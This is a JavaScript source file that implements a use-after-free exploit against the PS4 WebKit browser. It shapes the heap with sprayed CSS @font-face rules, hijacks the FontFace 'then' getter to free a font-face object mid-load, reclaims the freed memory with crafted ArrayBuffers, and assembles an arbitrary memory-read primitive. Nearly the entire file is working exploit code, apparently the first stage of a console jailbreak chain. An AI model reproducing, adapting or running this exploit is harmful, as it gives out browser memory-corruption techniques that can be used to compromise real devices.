// userland.js — UAF trigger + read primitive (memory-safe for PS4 browser)

const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024; // conservative PS4 renderer budget

// ─── Memory helpers ──────────────────────────────────────
function memUsage() {
  // Chrome/WebKit expose performance.memory; PS4 may or may not.
  if (performance && performance.memory) {
    return {
      used: performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit,
    };
  }
  return null;
}

function memLog(label) {
  const m = memUsage();
  if (m) {
    const usedMB = (m.used / 1048576).toFixed(2);
    const totalMB = (m.total / 1048576).toFixed(2);
    logger.debug(`[mem:${label}] used=${usedMB}MB total=${totalMB}MB`);
  } else {
    logger.debug(`[mem:${label}] (no performance.memory on this build)`);
  }
}

function assertMemoryHeadroom(extraBytes, stage) {
  const m = memUsage();
  if (!m) return; // can't check, proceed
  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
    throw new Error(
      `OOM guard at ${stage}: ` +
      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
    );
  }
}

// ─── Embedded tiny font source (avoids font enumeration) ─
// A minimal data URL that WebKit accepts as a font source without
// triggering local font enumeration or network fetches.
const TINY_FONT_SRC =
  "url(data:font/woff2;base64," +
  "d09GMgABAAAAAAAgAA8AAAAAADwAAQAAAAAAAAAAAAAAAAAAAAAAAAAABmAAgmQqBAgEEQgKiBSFAgE2AiQDgkQBCAqBFgEIBAAhEAA=" +
  ")";

// ─── init_rw ─────────────────────────────────────────────
async function init_rw(opts = {}) {
  // Tuneable; defaults chosen for PS4 memory budget
  const sprayCount = opts.sprayCount ?? 0x10; // 16, was 176
  const verbose    = opts.verbose ?? true;

  logger.info(`Initiate UAF (sprayCount=${sprayCount})...`);
  memLog("start");

  // ── Precompute rule strings ──
  const sprayRule =
    `@font-face{font-family:spray;src:${TINY_FONT_SRC};unicode-range:U+0043}`;
  const uafRule =
    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;

  // ── Create the two FontFace objects ──
  // A: resolves synchronously (local source)
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  // Style element (single, reused)
  const style = document.createElement("style");
  document.head.appendChild(style);

  // ── Spray rules BEFORE the victim (heap shaping) ──
  const halfSpray = Math.floor(sprayCount / 2);
  for (let i = 0; i < halfSpray; i++) {
    try {
      style.sheet.insertRule(sprayRule, style.sheet.cssRules.length);
    } catch (e) {
      throw new Error(`insertRule (pre) failed at ${i}: ${e.message}`);
    }
  }

  // ── Victim rule ──
  const uafRuleIndex = style.sheet.cssRules.length;
  try {
    style.sheet.insertRule(uafRule, style.sheet.cssRules.length);
  } catch (e) {
    throw new Error(`insertRule (victim) failed: ${e.message}`);
  }

  // ── Spray rules AFTER the victim ──
  for (let i = halfSpray; i < sprayCount; i++) {
    try {
      style.sheet.insertRule(sprayRule, style.sheet.cssRules.length);
    } catch (e) {
      throw new Error(`insertRule (post) failed at ${i}: ${e.message}`);
    }
  }

  memLog("after-insertRule");

  // ── Force one layout recalculation ──
  // Using a single read so WebKit can't coalesce it away, but only once.
  void document.body.offsetTop;

  // ── Prepare ArrayBuffer slot array ──
  const abs = new Array(sprayCount);
  const abSize = constants.wk_CSSFontFace_sizeof;

  // Pre-flight memory check
  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");

  // ── Install the re-entrant `then` getter ──
  const oldThen = FontFace.prototype.then;

  let getterFired = false;
  let getterError = null;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A && !getterFired) {
        getterFired = true;

        try {
          // 1. Free the victim's rule while load() holds a ref
          style.sheet.deleteRule(uafRuleIndex);

          // 2. Free the victim's neighbours
          for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
            const rule = style.sheet.cssRules[i];
            if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
              style.sheet.deleteRule(i);
            }
          }

          // 3. Force deconstruction of the freed CSSFontFace objects
          void document.body.offsetTop;

          // 4. Detach the style element entirely — releases remaining CSSOM
          try { style.remove(); } catch (_) {}
          try { document.head.removeChild(style); } catch (_) {}

          // 5. Spray ArrayBuffers to reclaim the freed slot
          let allocated = 0;
          for (let i = 0; i < abs.length; i++) {
            try {
              const ab = new ArrayBuffer(abSize);
              const view = new DataView(ab);

              view.setBInt(8, 1, true);                              // refcount
              view.setUint8(constants.wk_CSSFontFace_m_status, 3);   // Success

              if (version.major >= 13) {
                const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
                view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
                for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
              }

              abs[i] = ab;
              allocated++;
            } catch (e) {
              // Out of memory partway through — record and stop
              getterError = `ArrayBuffer alloc failed at ${i}/${abs.length}: ${e.message}`;
              logger.error(getterError);
              break;
            }
          }

          if (verbose) {
            logger.debug(`[getter] allocated ${allocated}/${abs.length} ArrayBuffers`);
          }
          memLog("after-spray");

        } catch (e) {
          getterError = e.message;
          logger.error(`[getter] error: ${e.message}`);
        }
      }

      return undefined;
    },
  });

  // ── Trigger the UAF ──
  logger.debug("Triggering document.fonts.load('1em a, b', 'AB')...");
  let fonts;
  try {
    fonts = await document.fonts.load("1em a, b", "AB");
  } catch (e) {
    // Restore prototype before rethrowing
    Object.defineProperty(FontFace.prototype, "then", {
      configurable: true,
      value: oldThen,
    });
    throw new Error(`document.fonts.load threw: ${e.message}`);
  }

  // ── Restore prototype ASAP ──
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: oldThen,
  });

  logger.debug(`fonts.length = ${fonts.length}`);
  memLog("after-load");

  // ── Report the getter error if it fired ──
  if (getterError) {
    throw new Error(`UAF getter failed: ${getterError}`);
  }

  if (!getterFired) {
    throw new Error("UAF getter never fired (A did not resolve first)");
  }

  if (fonts.length !== 2) {
    throw new Error(
      `Unable to reclaim UAF FontFace (fonts.length=${fonts.length})`
    );
  }

  logger.info("UAF Achieved !!");

  // ── Find the UAF FontFace ──
  let uaf_font = null;
  for (const f of fonts) {
    if (f.unicodeRange === "U+0-10FFFF") {
      uaf_font = f;
      break;
    }
  }
  if (!uaf_font) {
    throw new Error("Unable to find UAF FontFace !!");
  }
  logger.info("Found UAF FontFace !!");

  // ── Find the aliased ArrayBuffer (refcount 2) ──
  let uaf_ab = null;
  let uaf_ab_index = -1;
  for (let i = 0; i < abs.length; i++) {
    const ab = abs[i];
    if (!ab) continue;
    try {
      const v = new DataView(ab);
      if (v.getBInt(8, true).eq(2)) {
        uaf_ab = ab;
        uaf_ab_index = i;
        break;
      }
    } catch (_) { /* skip */ }
  }
  if (!uaf_ab) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }
  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);

  // ── Free every ArrayBuffer we don't need ──
  // Drop references so the GC can reclaim them before the read stage.
  for (let i = 0; i < abs.length; i++) {
    if (i !== uaf_ab_index) abs[i] = null;
  }
  abs.length = 0;

  // Also release the load-result array
  fonts.length = 0;

  // Clear any FontFaceSet entries we added that aren't the UAF victim
  try {
    document.fonts.delete(A);
  } catch (_) { /* ignore */ }

  memLog("after-reclaim");

  // ── Assemble the read primitive ──
  const self = {
    uaf_ab,
    uaf_font,

    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          const pay_off = tag_off + 8;

          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
          uaf_view.setBInt(pay_off, ptr, true);
        } else {
          uaf_view.setBInt(
            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },

    cleanup() {
      try { document.fonts.clear(); } catch (_) {}
      try { style.remove(); } catch (_) {}
      self.uaf_ab = null;
      self.uaf_font = null;
    },
  };

  return self;
}
